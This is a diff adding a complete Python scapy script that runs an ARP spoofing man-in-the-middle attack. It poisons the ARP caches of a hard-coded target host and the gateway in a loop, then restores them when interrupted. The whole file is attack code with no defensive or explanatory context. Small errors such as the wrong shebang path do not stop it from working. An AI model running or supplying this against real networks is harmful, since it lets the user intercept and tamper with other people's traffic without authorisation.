@@ -1,0 +1,41 @@
+#!/usr/lib/env python
+import scapy.all as scapy
+import sys
+import time
+
+
+def get_mac(ip):
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_req = scapy.ARP(pdst=ip, psrc="192.168.1.17")
+    broadcast_arp_req = broadcast / arp_req
+    ans = scapy.srp(broadcast_arp_req, verbose=False)[0]
+    return ans[0][1].hwsrc
+
+
+def spoof(target_ip, src_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=src_ip)
+    scapy.send(packet, verbose=False, count=4)
+ 
+
+def restore(target_ip, src_ip):
+    target_mac = get_mac(target_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc=src_mac,psrc=src_ip)
+    scapy.send(packet, verbose=False, count=4)
+
+target_ip = "192.168.1.18"
+gateway_ip = "192.168.1.1"
+try:
+    pkts_set_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        print("\r[+] sent_packets:" + str(pkts_set_count)),
+        sys.stdout.flush()
+        pkts_set_count += 2
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected ctrl+C.....wait \n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
